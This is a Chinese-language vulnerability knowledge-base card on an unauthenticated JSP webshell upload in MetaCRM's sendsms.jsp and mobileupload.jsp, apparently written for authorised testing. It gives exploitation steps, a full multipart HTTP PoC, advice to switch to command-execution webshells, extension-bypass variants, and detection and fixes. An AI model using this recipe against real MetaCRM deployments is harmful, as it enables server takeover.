---
id: web-generic-file-upload-crm-sendsms-mobileupload-jsp
title: MetaCRM 前台 sendsms.jsp / mobileupload.jsp 上传 JSP WebShell（Upload 类 UUID+原始后缀）
type: scenario
domain: web
path: web/generic/file-upload
technique: crm-sendsms-mobileupload-jsp-upload
tags:
- java
- jsp
- file-upload
- webshell
- crm
- unauth
- web
cve: []
severity: critical
confidence: high
affected_versions: MetaCRM 6.4.2（原文审计源码版本）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V235
  verified_at: '2026-11-07T09:35:22+08:00'
  notes: 已对照原文与图11-18、29-31核对：sendsms.jsp 需有效 Cookie、mobileupload.jsp 原文无 Cookie、Upload 类 UUID+原始后缀、/userfile/default/temp 落地执行均一致；affected_versions 收敛为 MetaCRM 6.4.2。dup-scan 与 softlogo 卡判 likely_duplicate，经原文裁决为不同入口/不同组件（前台 Upload vs 后台 DiskFileUpload、temp vs userlogo、Cookie 要求不同），两张并列保留；kb dedup 对 sendfile 卡的同链提示按入口分卡惯例保留。未验证点：未复跑上传。frontmatter 无 sources/source_url。
url: /docs/web/generic/file-upload/web-generic-file-upload-crm-sendsms-mobileupload-jsp/
draft: false
kb_aliases:
- MetaCRM sendsms.jsp 上传
- MetaCRM mobileupload.jsp 上传
- 前台任意文件上传
- Upload 类 UUID 原始后缀
- /userfile/default/temp JSP
- CRM WebShell
---

## 一句话结论

MetaCRM 的 `/business/common/sms/sendsms.jsp` 与 `/mobile/mobileupload.jsp` 都使用 `com.metasoft.framework.pub.upload.Upload` 处理 multipart：文件名由 `UUID.getID()` 加客户端原始后缀组成，保存到 `Path.getUserFile()+"temp"+File.separator` 下的 Web 可访问目录，不校验扩展名/内容；攻击者上传 `.jsp`（sendsms 需有效 Cookie）后访问 `/userfile/default/temp/<uuid>.jsp` 即可执行，原文两处均用 `helloworld` JSP 验证成功。

## 原理

- **公共上传类**：`Upload myUpload = new Upload(); myUpload.initialize(pageContext); myUpload.upload();` 解析 multipart。`String affix = myUpload.getFiles().getFile(0).getFileName();` 取得客户端原始文件名；`fieldID = UUID.getID(); if (affix.indexOf(".") != -1) fieldID += affix.substring(affix.lastIndexOf("."));` 只保留最后一个点之后的后缀，主文件名随机化。
- **保存路径**：`String path = Path.getUserFile() + "temp" + java.io.File.separator;`，随后 `myUpload.saveAs(path, fieldID); fileFullName = path + fieldID;`。`Path.getUserFile()` 返回 `getEnterpriseUserFile("default")`，即 `<context>/userfile/default/`；`temp` 子目录在 Web 根下，Tomcat 会把 `.jsp` 当脚本编译。
- **没有过滤**：代码不检查扩展名、Content-Type、文件魔数；`affix` 的后缀直接拼到 UUID 后。随机文件名只防止覆盖，不防止上传可执行后缀。
- **sendsms.jsp**：路径 `/business/common/sms/sendsms.jsp`；原文请求带合法 Cookie（`JSESSIONID` + `username`/`loginway` 等），响应中 `affixpath` 暴露落盘绝对路径 `D:\MetaCRM642xin\webapps\userfile\default\temp\<uuid>.jsp`；访问该 URL 返回 `hello`，证明执行。
- **mobileupload.jsp**：路径 `/mobile/mobileupload.jsp`；原文无需 Cookie 即可上传，响应中 `affixpath` 为 `/userfile/default/temp/<uuid>.jsp`；访问返回 `helloworld`，证明执行。
- **同产品其他入口**：`/business/common/importdata/sendfile.jsp`（已有卡）、`/develop/systparam/softlogo/upload.jsp`（已有卡）也是同类；`/common/jsp/upload.jsp` 与 `/common/jsp/upload2.jsp` 代码中同样以 UUID+原始后缀保存，但含 `UserManager.getUserBySessionId` 鉴权检查，需要有效会话（原文将它们标为前台/后台，实际以代码鉴权为准）。

## 触发条件

- 目标部署 MetaCRM，`sendsms.jsp` / `mobileupload.jsp` 可从攻击面访问。
- 上传目录 `userfile/default/temp` 位于 Web 根且 Tomcat 对 `.jsp` 正常解析。
- sendsms.jsp 需要有效 Cookie/会话；mobileupload.jsp 原文未要求 Cookie（若目标版本加了鉴权则以实际为准）。
- 目标未禁用上传目录脚本执行、未对 multipart 的 `.jsp` 文件名/内容做 WAF 拦截。

## 利用步骤

1. 访问 `sendsms.jsp` 或 `mobileupload.jsp`，确认 multipart 接口存在。
2. 构造 POST multipart，字段名 `file`，文件名 `example.jsp`，内容 `<% out.println("hello"); %>`；sendsms 需带有效 `JSESSIONID` 与业务 Cookie。
3. 从响应 HTML/JS 中查找 `affixpath`/`fileFullName` 或路径规律，得到 `/userfile/default/temp/<uuid>.jsp`。
4. 直接 GET 该 URL，确认返回 `hello`/`helloworld`，证明 JSP 执行。
5. 替换为命令执行/加密 WebShell（冰蝎、哥斯拉等），或先上传探测文件再上传正式载荷；授权测试只执行只读命令。
6. 若 UUID 路径不可见，可按响应中的绝对路径、目录列表或错误信息定位；必要时结合其他文件读取接口。

## PoC

```http
POST /mobile/mobileupload.jsp HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----geckoformboundary11650618572702eb486b96a57474ff44

------geckoformboundary11650618572702eb486b96a57474ff44
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: application/octet-stream

<% out.println("helloworld"); %>
------geckoformboundary11650618572702eb486b96a57474ff44--
```

响应中可见：

```text
affixpath=/userfile/default/temp/367acd1ef10b5a7c75970623dcac0cbd.jsp
```

访问：

```http
GET /userfile/default/temp/367acd1ef10b5a7c75970623dcac0cbd.jsp HTTP/1.1
Host: target
```

```text
helloworld
```

sendsms.jsp 同理，需带有效 Cookie；原文响应中的 `affixpath` 为 `D:\MetaCRM642xin\webapps\userfile\default\temp\<uuid>.jsp`。

## 变体与关联

- 变体：`.jspx`、`.jspf`、大小写 `.JSP`、尾部空格等，视容器/WAF；核心是后缀未校验。
- 变体：上传目录若可配置到其他 Web 路径，落地 URL 随之变化；`childPath`/`AttachmentFolderRule` 规则可能影响 `upload2.jsp` 的路径。
- 关联：[[web-generic-file-upload-crm-sendfile-jsp-preserve-suffix]]（同产品 sendfile.jsp 的 UUID+原始后缀上传，入口不同）、[[web-generic-file-upload-crm-softlogo-jsp-no-filter]]（同产品 softlogo/upload.jsp 的无过滤上传）。
- 边界：sendsms 需 Cookie；上传目录禁止脚本执行或 WAF 拦截 JSP 时失效；UUID 文件名不可预测，需从响应获取路径。

## 检测与防御

- 检测：`sendsms.jsp`/`mobileupload.jsp`/`common/jsp/upload*.jsp` 的 multipart 中出现 `.jsp/.jspx/.jspf` 文件名；`/userfile/default/temp/` 下新增脚本文件；上传后短时间内访问该新文件；响应中出现 `affixpath` 指向 `.jsp`。
- 修复：所有上传入口统一使用白名单/魔数校验；上传目录移出 Web 根或禁止脚本解析；`Upload` 类对后缀做白名单并重命名为无后缀/固定后缀；`sendsms.jsp`/`mobileupload.jsp` 增加鉴权与权限校验。
- 加固：WAF 检查 multipart 文件名与 JSP 内容；定期排查 `/userfile/**` 可疑脚本；下线历史接口。
